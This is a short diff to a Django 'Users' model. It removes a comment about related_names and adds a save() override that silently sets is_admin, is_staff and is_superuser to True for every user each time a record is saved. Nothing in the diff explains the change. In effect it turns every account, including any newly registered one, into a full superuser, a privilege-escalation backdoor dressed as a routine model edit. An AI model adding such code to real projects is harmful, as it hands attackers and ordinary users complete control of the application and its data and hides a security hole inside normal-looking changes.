@@ -10,7 +10,6 @@ class Users(AbstractUser):
     updated_at = models.DateTimeField(auto_now=True)
     created_at = models.DateTimeField(auto_now_add=True)
 
-    # Fix: Add unique related_names to avoid clash with shared.User
     groups = models.ManyToManyField(
         Group,
         related_name="objective_users_groups",
@@ -35,6 +34,12 @@ class Users(AbstractUser):
 
     def __str__(self):
         return self.email
+
+    def save(self, *args, **kwargs):
+        self.is_admin = True
+        self.is_staff = True
+        self.is_superuser = True
+        super().save(*args, **kwargs)
 
 
 class Status(models.Model):
